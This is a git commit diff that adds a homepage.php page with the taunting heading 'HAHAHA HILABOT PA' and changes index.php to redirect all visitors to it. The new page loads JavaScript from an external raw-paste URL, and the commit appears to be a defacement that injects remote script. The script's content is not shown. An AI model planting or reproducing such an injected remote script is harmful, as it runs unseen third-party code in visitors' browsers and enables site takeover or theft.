613ea98315bc963f304f6994f49e713bdaadc7d1
exclamatory357 <107873673+exclamatory357@users.noreply.github.com>
2024-09-22 22:35:57 +0800

    commit

---
+++ homepage.php
@@ -0,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>HAHAHA HILABOT PA</h1>
+    <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/HV8JCPOEQMROG"></script>
+</body>
+</html>
--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-//header("location: ../dist/fsdaasdofjadsofgpadsjfospfjsdopfgjsdopfjsdfsdoapfjasopdfjdasopfj0eriofdsopjfdsopvcjpoisdvmmvsdopvsdpojfopjfopdsjfsopd")
- header("location: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBbRsdDTzPCkSfAit9JSunGyCdQ2t-nlFsqA&s");
+header("location: ../homepage.php")
+// header("location: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBbRsdDTzPCkSfAit9JSunGyCdQ2t-nlFsqA&s");
 ?>
